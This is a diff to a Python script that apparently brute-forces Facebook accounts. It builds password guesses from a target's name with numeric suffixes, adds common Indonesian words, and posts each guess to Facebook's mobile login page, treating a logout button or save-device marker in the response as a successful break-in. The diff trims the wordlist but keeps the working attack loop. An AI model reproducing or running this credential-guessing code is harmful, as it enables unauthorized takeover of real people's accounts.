@@ -314,22 +314,12 @@ def pilih_menumbasic():
                  name.lower() + '123',
                  name.lower() + '1234',
                  name.lower() + '12345',
-                 name.lower() + '12346',
-                 name.lower() + '1234567',
-                 name.lower() + '12345678',
-                 name.lower() + '123456789',
-                 name.lower() + 'nih Bos',
+
+
                  'anjing',
                  'bangsat',
-                 'sayang',
-                 'Doraemon',
-                 'Naruto123',
-                 'anjing123',
-                 'bangsat1234',
-                 'sayang123',
-                 'Doraemon123',
-                 'Naruto1234',
-                 'wibu12345']:
+                 'sayang']:
+      
                 rex = requests.get('https://free.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': uas })
                 xo = rex.content
                 if 'free_logout_button' in xo or 'save-device' in xo:
